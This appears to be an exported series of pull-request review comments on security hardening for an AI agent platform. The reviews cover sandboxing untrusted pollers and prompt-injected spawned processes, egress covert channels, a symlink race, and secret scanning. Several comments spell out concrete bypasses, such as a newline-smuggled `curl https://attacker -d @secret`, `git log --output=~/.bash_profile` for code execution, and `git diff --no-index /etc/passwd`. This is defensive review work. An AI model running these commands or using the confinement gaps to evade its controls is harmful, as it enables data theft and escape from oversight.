2. **`configured_file_roots` is an operator-wide reachability check, not a poller-specific scoped-state capability.** The proposal says research pollers can write a scoped state root and that core/system paths are already unwritable. But the service adapter accepts the whole home and every configured `:rw` external root; here it returns true for `/workspace/mimir`, another poller's `skills/<name>/pollers.json`, and `memory/core/*`. The downstream file backend blocks live core and `state/identities.yaml`, but it intentionally allows the repository, all writable `state/`, `memory/`, `skills/`, `attachments/`, and `scratch/`. That lets one untrusted poller overwrite another poller's executable/config, change its own manifest or scripts for the next subprocess tick, modify non-core injected memory, or edit the live source checkout. Per-poller capabilities therefore need argument-level roots derived from immutable operator configuration—e.g. a specific `state/pollers/<name>/...` and/or explicitly named knowledge roots—not reuse of the global file-tool roots. The manifest must not be able to self-grant or mutate those authority declarations.

## Design questions / required clarifications

- `memory_store / saga_*` is too broad as one tier. The mapped set includes destructive/governance-shaped operations such as `saga_forget`, feedback/credit mutation, session-boundary writes, and commitment state changes, not just creation of a provenance-tagged recallable atom. Define the exact write operations and storage schema that carry immutable origin/integrity metadata; do not classify the whole `SAGA` sink category as `research-save`.
- The document's premise says the architecture is sound/no leak is constructable, but §6.3 itself identifies the missing integrity dimension: untrusted content can be folded into an operator turn and then drive newly allowed actions. That is the same confused-deputy class the enforcement flag is meant to contain, not only a hypothetical multi-user concern. I would make integrity/provenance of source data an enablement prerequisite, then derive sink authority from both confidentiality and integrity rather than globally trusting an operator-authenticated turn.
- `fetch_url` is a confidentiality/exfiltration sink only when protected data can influence its URL/request. A blanket ask for every operator-turn fetch is high-friction and does not solve other network egress available inside spawned agents or poller subprocesses. The design

payload.author: mimir-carreira
payload.body:
## Summary

Revision 2 fixes the generic-spawn, file-root, coarse-SAGA, and integrity-model issues from the prior review. One load-bearing containment premise remains false: the design now moves poller code work to `worklink_run`, but current Worklink execution is not process-confined. An isolated Git checkout plus after-the-fact repo-diff validation does not bound the child process's filesystem or network authority.

Until Worklink has an actually isolated compute substrate (or equivalent executable write/egress confinement), it cannot sit in the Contained tier for untrusted-payload turns. Please either classify current `worklink_run` as Unbounded and keep it blocked for untrusted payloads, or make that isolation a prerequisite to this enablement design.

The remaining directions are coherent, including source-derived integrity, narrow immutable per-trigger roots, operation-level memory capabilities, and a uniform child-process egress boundary. No tests were run because this revision changes documentation only; I checked the containment claims against the current Worklink implementation.

payload.author: mimir-carreira
payload.body:
## Summary

Revision 2 resolves the generic `spawn_*`, global file-root, coarse-SAGA, and integrity-model findings from round 1. One containment premise is still false, however: the live `worklink_run` path is not itself confined to an isolated worktree or a reviewed-PR-only blast radius. Because the tier model uses that premise to admit autonomous code execution from poller payloads, the design still is not safe to implement as written.

## Validation

- `139 passed` across access-control, Worklink autonomy-policy, and Worklink orchestrator tests.
- `38 passed` for the GitHub poller event suite.
- All five GitHub checks are green.
- Reviewed current head `fb3691d0` against the live Worklink checkout, compute, environment, evidence, and publication paths.

payload.author: mimir-carreira
payload.body:
## Summary

Revision 3 correctly fixes the prior blocking premise: it now says plainly that Worklink's isolated checkout is not process confinement, keeps generic `spawn_*` out of poller code work, and makes unknown-author code work notify-only. The narrow per-trigger file roots, operation-level SAGA scope, and source-identity integrity model are also the right directions.

One integrity/egress conflation still blocks approval, documented inline: an operator-approved URL is authorization to make a network request, not evidence that the response bytes are trusted. Treating all content from an approved host/URL as trusted lets ordinary third-party or prompt-injected web content drive trusted-only sinks under the document's own 2×2 model. Keep the allowlist as egress policy, preserve untrusted integrity on fetched content absent a separate authenticity attestation, and use explicit one-use declassification when the operator wants a particular fetched result to drive a privileged action.

Docs-only revision; I reviewed the changed design against the current access-control and Worklink capability contracts. No test run was needed.

payload.author: mimir-carreira
payload.body:
## Summary

Revision 4 fixes the previous approved-URL integrity conflation: fetched bytes now remain untrusted, Worklink remains trusted-code-only, and the capability/provenance decisions are explicit. One egress issue still blocks approval: destination allowlisting alone is not sufficient for payload-bearing network sinks, yet §5.4 makes approved-destination egress taint-independent across `web_search`, webhooks, external MCP, and child processes.

## Validation

- Reviewed the full revision delta from previously reviewed head `2c9ddc45` to `ed30ad99`.
- Compared the network-sink proposal with the current `web_search` target extraction, which authorizes against the configured API endpoint while the model-controlled query is separate request content.
- This is a docs/design PR; no local test execution was necessary for the remaining design-level blocker.

payload.author: mimir-carreira
payload.body:
Revision 5 fixes the round-4 payload-bearing sink issue, but the URL-is-destination branch still treats only URL text as payload. A model-controlled network call also carries information through its invocation pattern.

**Blocking:** exact-URL allowlisting does not justify taint-independent, arbitrary repeated fetches. Untrusted-derived data can be encoded in URL choice, order, count, or timing and observed in the approved endpoint's logs; redirects can also escape the initial exact URL unless each hop is constrained. The inline comment on `docs/security/enforcement-enablement.md` lines 297–301 gives the required design change: trusted deterministic dispatch for freely permitted heartbeat fetch sets, or an integrity/declassification gate on model-controlled invocation, plus redirect handling.

This is a design-doc-only revision, so I did not run the code test suite.

payload.author: mimir-carreira
payload.body:
Revision 7 closes the exact-URL selection and redirect gaps in the main egress section, but two load-bearing inconsistencies remain before this is implementation-ready:

1. The payload gate says to reuse the existing `ifc_state`, but that state tracks confidentiality/ACL labels, not source integrity, and is already tainted by trusted private operator ingress. The design needs an executable representation of the independent integrity dimension rather than treating “IFC clean” as equivalent to “no untrusted ingest.”
2. The work breakdown still says exact URLs are taint-independent without the trusted-deterministic-dispatch and per-hop redirect conditions established in §5.4; line 341 also retains the same overbroad “fully safe” claim.

I left both findings inline. Once the integrity-state representation and the implementation checklist are made consistent with the 2×2 and rev-7 egress rule, the design will be substantially coherent.

payload.author: mimir-carreira
payload.body:
Revision 8 fixes both revision-7 findings: integrity is now explicitly independent of confidentiality, and the exact-URL checklist retains deterministic dispatch plus per-hop redirect enforcement.

One implementation-blocking inconsistency remains. The proposed gate is `any` untrusted-integrity source in the shared `ifc_state`, while §5.3 requires untrusted auto-recall provenance to remain visible but not taint the turn. Because protected prompt/recalled sources already ride that accumulator, an integrity field alone cannot distinguish an active ingest from informational recall. I left an inline finding asking for an explicit executable distinction (for example, `integrity_effect: active_ingest | informational`, or a separate monotonic active-ingest state) and corresponding checklist language.

Once that distinction is specified, the design's integrity and egress rules should be coherent enough to implement.

payload.author: mimir-carreira
payload.body:
Revision 9 resolves the remaining integrity-state issue from revision 8.

The new server-assigned `integrity_effect` axis makes the required distinction executable without conflating it with confidentiality: current trigger/live-read sources are `active_ingest`, prompt-assembly recall/protected context is `informational`, and the gate now has one consistent predicate (`untrusted && active_ingest`). The recall section and implementation sequence use the same predicate, so auto-recall retains provenance without silently tripping the active-ingest gate.

I also rechecked the previously corrected egress and isolation requirements in the full document; the exact-URL deterministic-dispatch/per-hop redirect constraints and the prohibition on untrusted `worklink_run`/`spawn_*` execution remain intact.

This is now internally consistent and implementation-ready as a design document.

Rebase required (the merge blocker).** The branch is CONFLICTING with `main` — it predates the merged #1132 (#936) and #1136 (#938), which reworked the same files (main added ~+372/−119 to `access_control.py`, overlapping the exact `_get_allowed_sinks` / `classify_protected_result` regions this PR edits; also `budget_gate.py`, `registry.py`, `tests/test_budget_gate_and_alias.py`). payload.author: mimir-carreira

Summary: The placement before commit/push/PR is correct and the focused suites pass (41 tests), but this security gate is not yet safe to rely on.

Blocking findings:

Verdict: APPROVE

- `_assert_staged_diff_has_no_secret` now fails closed when `git diff --cached -U0` returns non-zero, before commit/push/PR.
- The refusal gate now uses a dedicated high-signal scanner whose patterns match the pre-commit content policy rather than the broader log-redaction policy, so benign `token=` placeholders do not become commit blockers.

I compared the scanner patterns against `mimir/templates/git/pre-commit`, inspected the new failure-path and placeholder regressions, and ran:

payload.author: jasoncarreira
payload.body:
Both findings addressed (d9cbe535).

1. **Fail closed when the scan can't run.** `_assert_staged_diff_has_no_secret` now refuses the commit (`WorklinkError`) if `git diff --cached -U0` exits non-zero, instead of accepting empty stdout from a failed command as "clean". Regression: a runner returning exit 128 → commit refused, commit not reached.

2. **Commit-aligned patterns, not the log redactor.** New shared `mimir/secret_scan.py` mirrors the authoritative `templates/git/pre-commit` content allowlist — high-signal, length-floored shapes (`ghp_…{30,}`, `sk-…{20,}`, `AKIA…{16}`, JSON `refresh_token`/`access_token`/`client_secret`, `xox…`), with **no** bare `token=`/`password=`. The scan calls `secret_scan.contains_secret`, so a refusal here agrees with the commit-time policy and won't false-block benign generated content. Regression: a benign `token=YOUR_TOKEN_HERE` placeholder now commits normally, while a real `ghp_`+36 still fails closed. payload.author: jasoncarreira
payload.title: security(spawn_open_code): confine model-supplied artifact_root to the agent home

payload.author: mimir-carreira
payload.body:
Blocking finding:

- `mimir/tools/registry.py` (the post-spawn artifact writes around the new `artifact_base / ".factory" / ...` block): this validation is vulnerable to a symlink TOCTOU and does not actually confine the writes. `_confined_artifact_base()` resolves the model-supplied path before launching OpenCode, but the spawned process runs before `.factory` is created and the files are written. That process can replace an initially valid in-home path (or create a previously nonexistent one) with a symlink to an outside directory. The already-resolved `Path` remains the same lexical `/home/...` path, so the later `mkdir()`/`write_text()` calls follow the new symlink and write the prompt/stdout/stderr outside the home. A prompt-injected spawn is exactly the actor capable of making that filesystem change during this window.

Please make the write path race-safe rather than relying on one pre-spawn `resolve()` check. The safest design is to remove model selection of the persistence root and use a trusted, pre-opened directory with descriptor-relative/no-follow writes (or route every artifact write through an equivalent confinement primitive that rejects symlinks at write time). A second `resolve()` after the subprocess narrows but does not close the race. Add a regression where the mocked runner replaces an accepted in-home artifact root with an outside-pointing symlink before returning and assert nothing is written outside.

CI is green, but this issue defeats the security property the PR is intended to establish, so I’m requesting changes.

payload.author: mimir-carreira
payload.body:
Verdict: APPROVE

The remediation at 5ddd58ed closes the prior TOCTOU on artifact persistence. `_write_run_artifacts_confined` anchors traversal at the trusted resolved home directory descriptor, opens every path component with descriptor-relative `O_NOFOLLOW`, and creates artifact files with `O_NOFOLLOW | O_CREAT | O_EXCL`. A symlink planted by the untrusted subprocess at `.factory`/`runs` is therefore rejected rather than followed outside the home.

I inspected the descriptor lifecycle and best-effort failure path and ran:

`uv run pytest tests/test_spawn_opencode.py -q`

Result: 14 passed. The new regression simulates the runner planting `home/.factory -> outside` and verifies no outside artifact is written and no artifact directory is reported. GitHub's full pytest (3.11/3.12), frontend, skill-conformance, and Claude Code smoke checks are also green at this head.

payload.author: mimir-carreira
payload.body:
The descriptor-relative `O_NOFOLLOW` write path closes the symlink TOCTOU I previously flagged, and the new during-run symlink regression exercises the relevant attack surface. CI is green on Python 3.11 and 3.12.

One blocking availability regression remains: invalid `artifact_root` refusal now happens after reserving a shared per-hour spawn slot but does not release that reservation. Because the argument is model-controlled, repeated refused calls can exhaust the allowance without launching a subprocess and suppress otherwise legitimate Claude/Codex/OpenCode spawns for the rest of the hour. I left the exact-line finding inline; release the token on both new early-return paths and cover the rate-window postcondition.

payload.author: jasoncarreira
payload.body:
Addressed the TOCTOU (5ddd58ed). You're right that a single pre-spawn `resolve()` doesn't confine the actual writes — the untrusted subprocess runs in between and can plant a symlink at the predictable `.factory`/`.factory/runs` prefix.

Fix: `_write_run_artifacts_confined` now walks from the trusted, already-resolved home **directory fd**, creating and re-opening each path component with `O_NOFOLLOW` (openat semantics), and writes each file with `O_NOFOLLOW | O_CREAT | O_EXCL`. Any symlink planted at any component is rejected (`OSError`) rather than followed, so the writes cannot leave the home. `run_id` is unpredictable to the subprocess, so the run dir and its files can't be pre-planted. On rejection/failure it skips artifacts (best-effort) with `artifact_dir=None` — no silent redirect. The pre-spawn check stays only as a cheap fail-fast.

Regression added exactly as you suggested: a mocked runner plants `home/.factory -> outside` during the run; the test asserts nothing is written outside and `artifact_dir is None`. (This fails against the old `Path.mkdir`/`write_text` path.)

payload.title: Worklink #934: authz: propagate the frozen AuthContext into deepagents subagent (task/atask) tool calls so delegation authorizes under the parent carrier

payload.author: jasoncarreira
payload.body:
2-agent adversarial review (security/concurrency + monkeypatch-robustness) + my own verification. Clean. The parent's exact frozen AuthContext is propagated to the child (no widening — same object; no re-derivation), only an actual AuthContext from runtime.context is admitted (isinstance gate → forged/lookalike/None fails closed), the ContextVar set→await→read is a single-task chain with per-task Context isolation (empirically verified: 3 concurrent alice/bob/carol carriers stay isolated; only degenerate outcome is fail-closed-to-None), and the child uses the parent's frozen enforcement_enabled not live env. Monkeypatch is compatible with pinned deepagents 0.6.1 (both patched symbols exist; idempotent via _PATCH_MARKER; _AuthContextRunnable implements exactly the invoke/ainvoke deepagents calls — user streaming flows through config callbacks, preserved; in-place func/coroutine swap keeps langgraph's runtime injection). Genuine tests: admin-parent→child allowed, non-admin-parent→denied (no-widening), frozen-enforcement-beats-live-env, forged-lookalike→None/missing_auth_context. 5/5 CI green.

Re the security reviewer's F1 (BudgetGateMiddleware allegedly absent from subagents → delegation bypass): I verified this is a FALSE POSITIVE. deepagents _get_subagents honors the spec 'middleware' key in BOTH the new API (subagents.py:651 middleware=list(spec.get('middleware',[])) → create_agent(middleware=...)) and legacy (:351), and mimir passes build_mimir_subagents() (agent.py:1523) whose dicts set middleware=[BudgetGateMiddleware()] for BOTH general-purpose (spread over GENERAL_PURPOSE_SUBAGENT, suppressing the ungated auto-add) and critic-structured. The reviewer's empirical repro showed only deepagents' default stack (no BudgetGateMiddleware) — a stack only producible from specs WITHOUT the middleware key — so it wasn't mimir's real subagents. So the middleware DOES run in mimir's subagents and this fix benefits all subagent tool calls (middleware-gated + per-tool-gated), and the add_schedule test is valid.

Non-blocking follow-up (fold into #923): add an E2E test that installs the patch and drives a middleware-gated admin tool through the real deepagents task→subagent→BudgetGateMiddleware path asserting it authorizes under the propagated parent carrier — this both settles F1 in CI and guards against a future deepagents upgrade silently changing the runtime-injection seam (the monkeypatch's fail-closed fragility point). payload.author: jasoncarreira
payload.body:

1. **Don't drop the agent's OWN self-regulation feedback (live-immediate).** For a non-privileged turn, _authorized_records drops every record whose _record_principal is None. But the agent's self-signals are principal-less by design — turn_error, loop_warn/loop_stop, error, algedonic_escalation, cross_turn_loop, claude_code_spawn_*, wiki_backlinks_unhealthy, scheduler_invalid_cron — so the agent goes blind to its own algedonic self-regulation on every non-admin user turn. 2. **commitment_due/commitment_expired have no owner (live functional gap).** The poller emits them without owner_principal (commitments/poller.py:~225), so today they're dropped for ALL non-privileged users — a user never sees their OWN reminders. This overlaps sibling leaf #925 (owner-bind commitments) — either fix the emitter here or coordinate with #925, but the end state must be: owner sees own reminders, cross-tenant stays filtered. Do not rely on the agent-self allowlist for these.

3. **Fix the #498 windowed-scan regression (live-immediate, hits the operator path too).** _RecordSnapshot hardcodes saturated=False, so iter_window_records never falls back to streaming the file — defeating #498. Use the prefixed service principal in the block ACL so it matches.

6. **Make the block labels a real second line of defense (defense-in-depth).** Block authorized_principals currently default to {requester}, so a bloc

payload.author: jasoncarreira
payload.body:
2-agent adversarial review + my own empirical verification. The core #927 design is sound (session-id binding is server-authoritative and fail-closed; reflect.py authorizes the existing row's identity before any mutation; idempotent path discards attacker content; denials are non-enumerating) — BUT there is a BLOCKING functional regression that breaks the normal session-end write path for 100% of real user sessions, and it is currently masked by the tests.

**BLOCKING — composition break with the merged #926.** The new client-layer gate in mimir/saga/client.py::end_session rejects every real session-end write:

    if isinstance(mutation_scope, _ServiceMutationScope) and not (
        owner_principal == mutation_scope.owner_principal        # "service:synthesis"
        or origin_domain in mutation_scope.readable_domains       # ("session","saga","filesystem","turn_history")
    ):
        raise PermissionError("session write denied")

#926 (already on main) stamps the durable session row with the INHERITED USER ACL: owner_principal = the user (e.g. \"alice\") and origin_domain = the INGRESS domain (event.source = \"discord\"/\"slack\"/\"web\"). The synthesis service's readable_domains are RESOURCE-CLASS domains (session/saga/filesystem/turn_history), not ingress domains. So for every real synthesis turn: owner_principal (\"alice\") != \"service:synthesis\" AND origin_domain (\"discord\") not in readable_domains → PermissionError. The non-provenance-complete fallback (owner_principal=\"legacy_admin\", origin_domain=None) is rejected too (None not in readable_domains). Net: no session-boundary rows are ever written and cross-session continuity silently dies. This fires regardless of MIMIR_ACCESS_CONTROL_ENFORCED (the gate is unconditional). Empirically reproduced against this PR head with enforcement OFF: can_write_saga=True but the tool returns \"session write denied\", no sessions row written; SagaStore.end_session matrix: origin_domain=\"saga\"→OK, \"discord\"/\"slack\"/None→PermissionError.

**Masking (why CI is green):** (1) tests/test_saga_write_provenance.py::test_saga_end_session_uses_runtime_not_model_session_for_authority uses a MOCK store that records kwargs and returns success — it asserts origin_domain=\"discord\" reaches end_session but never runs the real _saga_mutation_scope gate that rejects it (the mock accepts what production rejects — same #1109 pattern). (2) the two new tests in test_saga_mutation_authorization.py use the real SagaStore but shape origin_domain=\"saga\" (which is in synthesis's readable_domains), so the gate passes. Had either used \"discord\"/\"slack\", CI would have caught the break.

payload.title: Worklink #926: authz: inherit source-session ACL through synthesis outputs

payload.author: jasoncarreira
payload.body:
2-agent adversarial review (logic/leak/forgery + tests/masking/regression) plus my own verification. **The core design is sound and this is a genuine security improvement** — keep it as-is. The SessionACL accumulation/intersect is fail-closed and monotonic (mixed/missing provenance → legacy_admin admin-only; visibility only ever narrows), the carrier is unforgeable via client/HTTP paths, saga_end_session stamping a user-owned row is intended and composes cleanly with #907/#913/#897/#869 (can_write_saga authorizes on service identity, not the stamped owner; removed is_trusted_service import is safe — still used in saga_record_skill_learning), and read-back is correct (owner reads own boundary, unrelated user denied, legacy_admin/service fallback is admin/platform-only never public). No masking; CI green. Pre-PR every boundary was service-owned/unreadable by its author, so the fail-closed cases are not regressions.

Three scoped hardening changes before merge (do NOT alter the core logic or widen anything):

1. **Strip client-asserted channel_visibility on the generic POST /event ingress.** On /event the client `extra` is passed through strip_chat_skill_extra → strip_worklink_hint_extra → stamp_http_event_ingress_extra, none of which removes `channel_visibility` (server.py ~340). This PR newly routes channel_visibility (agent.py:1533 → SessionManager.touch → SessionACL) into the DURABLE boundary/commitment visibility, so an authenticated user can POST /event with extra.channel_visibility=\"public\" and self-publish their own synthesized boundary to all readers. Self-scoped (owner is server-derived; mixed sessions fail closed) — no cross-user leak — but it contradicts this module's own stated rule that generic ingress must not accept a client declassification signal (models.py:241-243). Fix: strip/ignore channel_visibility on /event (same pattern as the chat-skill/worklink keys) so client HTTP ingress defaults to \"private\"; channel_visibility must remain trusted bridge-set metadata only (discord.py/slack.py). Add a test: a generic /event with extra.channel_visibility=\"public\" does NOT yield a public durable boundary.

2. **Add negative + end-to-end tests for the source_session_acl carriage gate** (access_control.py:2660-2667) — this is the security-critical forgery-prevention seam and it is currently untested. Add: source_session_acl is NOT carried onto the AuthContext when (a) trigger != saga_session_end, (b) the event carries HTTP ingress (event_ingress stamped), (c) service_principal is forged/mismatched, (d) registered_service is None; plus one end-to-end test that a genuine synthesis event's source_session_acl flows through create_auth_context → auth_context.source_session_acl → the durable write (the current tests inject the ACL onto a hand-built AuthContext, bypassing the gate entirely). Also add the commitment-extraction fallback-branch test (turn_hooks.py:284 — missing source_acl → legacy_admin/service/service_name=synthesis).

3. **Align the carriage gate with its sibling (defense-in-depth).** The source_session_acl gate checks only the event_ingress param (None at the callsite for every event); the sibling is_service elevation gate additionally rejects a stamped HTTP_EVENT_INGRESS_EXTRA_KEY. Add that same stamped-key check to the source_session_acl gate so it isn't strictly weaker than its sibling.

Non-blocking (optional; fine to leave for the hardening leaf): hoist source_acl out of the per-record loop (turn_hooks.py:274); consider reusing Ownership.intersect_acl instead of duplicating it in SessionACL.intersect; align the commitment fallback visibility (\"service\") with the boundary fallback (\"legacy_admin\") — cosmetic, both read admin/platform-only.

Separately (not this PR): this leaf overlaps #927 (also rewrites saga_end_session) and #925 (also owner-binds commitments in turn_hooks.py) — they'll need sequencing/reconciliation as they land.

payload.author: jasoncarreira
payload.body: Reviewed the retry logic end to end + verified the tests are genuine. payload.author: jasoncarreira
payload.body:

Protected reads (SAGA/history/file/commitments/metadata/MCP + subagent via shared ctx) produce authoritative source labels from validated args (so partial/ERROR results taint identically); _merge_result_labels unions them into the per-turn ifc_state and refreshes the frozen carrier (shared ifc_state → forked/continuation requests see the taint) in BOTH sync + async, before any next model/sink boundary; all egress boundaries (send, harness auto-deliver, resend-nudge, activity panel) read live labels + re-pull guarded by turn_id. payload.author: mimir-carreira
payload.title: Worklink #919: authz/IFC: enforce destination-specific trusted-service sink authority

payload.author: jasoncarreira
payload.body:
Two-agent adversarial review (logic + tests), the top finding empirically reproduced by both and verified by me. **The core redesign is sound** — destination-specific policy genuinely replaces the category-wide early-allow, service authority no longer skips the IFC sink gate, unknown/missing target denies, category membership alone can't allow, the capability-matrix completeness gate rejects unbacked sink grants, and #906/#915/#1107/#1108/#914 compose cleanly with no weakened tests. But one HIGH blocker + two should-fixes:

**BLOCKING (HIGH) — shell-profile destination check bypassable via newline.** `_target_matches_shell_profile` (access_control.py:206-219) is the ONLY destination enforcement for service shell_exec/bash_async, and its metachar denylist `(";","|","&","`","$",">","<")` omits `\n`/`\r`. `shlex.split` treats newline as whitespace, and the executor runs the command via `bash -lc` (extra.py:341, a multi-statement script). So a scheduler/system service under enforcement can run `git status\ncurl https://attacker -d @secret`: argv → `git status …` → passes the scheduler_read_only git-read profile → no denylisted char → sink gate admits → bash runs the curl as a second statement (arbitrary shell + network egress + arbitrary write). Reproduced: single-line `curl …` denies (the only case the test covers), but `git status\ncurl …` and `git status\nrm -rf …` both ADMIT. This defeats #919's read-only/non-network shell guarantee. Immediate fix: denylist `\n`/`\r`. Real fix: validate the WHOLE command is a single allow-listed invocation (don't prefix-match argv[0..1] on a string handed to `bash -lc`) — or exec the argv directly without a shell for service shell ops. Add a newline-vector test that goes through the middleware.

**SHOULD-FIX (MEDIUM) — file-root divergence, enable-time functional regression.** The service-sink file adapter authorizes against `_configured_file_roots()` = MIMIR_HOME + **MIMIR_FILE_OP_ROOTS** (access_control.py:183-194), but the real file tools authorize out-of-home writes via Config.file_tool_roots from **MIMIR_FILE_TOOL_ROOTS** (#650/#869 CompositeBackend). On mimirbot (MIMIR_FILE_TOOL_ROOTS=/workspace/mimir:rw), a scheduler/synthesis/poller write_file to /workspace/mimir passes the file backend but the sink adapter returns service_sink_destination_denied under enforcement — fail-closed, but it breaks the documented factory/dev-checkout write path once enforcement is on. Reconcile the adapter to the SAME root config the file tools use (or explicitly union them), and add a test with MIMIR_FILE_TOOL_ROOTS set (every current file test sets only MIMIR_HOME, masking the divergence).

**SHOULD-FIX (MEDIUM) — deny path skips the real extraction seam.** _extract_sink_target (budget_gate.py:266-287) is the new model-args→sink-gate connector, but every service-DENY test feeds the target directly to check_sink_flow/authorize_tool; the only middleware (awrap_tool_call) test asserts the ALLOW path. Add a service-DENY test through BudgetGateMiddleware.awrap_tool_call (the newline test above can double as this) so a regression in the extraction seam is caught.

(LOW, note: spawn destination uses cwd as a weak proxy — an omitted cwd defaults to home → admitted; an out-of-root cwd DENY isn't tested. A spawned agent's capability isn't really bounded by cwd.)

Re-request review after the fix — I'll re-run the full pass, focused on the shell-profile hardening + the file-root reconciliation.

payload.author: jasoncarreira
payload.body:
Re-review of head aa755b52 (2-agent, logic finding empirically reproduced). The file-root reconcile and the destination-specific policy/composition are correct now — but the shell bypass is **still open** (HIGH), so this can't merge yet.

**BLOCKING (HIGH) — residual arbitrary-command execution via allowlisted binaries' flags.** Adding `\n`/`\r` to the denylist closed one instance, but `_target_matches_shell_profile` only validates argv[0]/argv[1] and the allowlisted subcommands expose write/exec/read flags on later argv — and service shell runs via `bash -lc` (login shell). Verified exploits for scheduler/poller/system under enforce:
- `git log '--format=format:<attacker text>' --output=~/.bash_profile` → argv is `git log` (passes read-only profile), writes attacker content to ~/.bash_profile; the NEXT `bash -lc` service turn sources it → **RCE** (login-shell bounce).
- `git diff --output=<path>` → unconfined arbitrary file WRITE, bypassing the MIMIR_FILE_TOOL_ROOTS boundary this very PR implements; `git diff --no-index /etc/passwd <path>` → arbitrary READ; `rg --pre=<cmd>` → arbitrary exec.

**A metacharacter denylist on a string handed to `bash -lc` cannot be made complete** — this is the same class as the prior round. Please fix it structurally, not with more denylist entries:
- Preferred: don't run service shell through a login shell string at all — exec the resolved argv directly (`subprocess`/no `-l`, no shell), so there's no statement-separation or profile-sourcing surface; OR
- A strict per-command ARGUMENT allowlist: for each allowed command, whitelist the exact permitted flags/subcommands and REJECT anything with `--output`/`-o`/`-O`/`--no-index`/`--pre`/`--pre-glob`/`-c`/`--upload-pack` etc. (and confine any file-producing flag to the configured write roots). Add tests for the `git --output`, `git --no-index`, `git log --format`, and `rg --pre` vectors.

**SHOULD-FIX — fragile/masking file test.** `test_service_file_policy_requires_configured_root_and_compatible_source`'s `outside_root` case probes `/tmp/arbitrary-service-write` and passes only on Linux CI (pytest tmp_path under /tmp → /tmp dropped by the home-overlap guard); on a non-/tmp home (production /mimir-home) /tmp is an always-rw root, so the write is ADMITTED and the test FAILS. It also masks that services can write anywhere under /tmp. Use an explicit dir outside home, the configured root, AND /tmp (or pass always_rw=()).

(Coverage note: only the shell `command` branch of _extract_sink_target is tested end-to-end through the middleware; file/spawn/url/mcp branches aren't.)

The newline/CR test, the live-middleware deny test, and the ro/rw file-root tests are genuine (proven to fail on the prior head). Re-request after the structural shell fix.

Please rebase onto current origin/main (post-#918) and resolve so BOTH land cleanly: #918's classify_protected_result / _merge_result_labels taint path AND #919's per-command argv allowlist (_target_matches_shell_profile) + file-root reconcile.
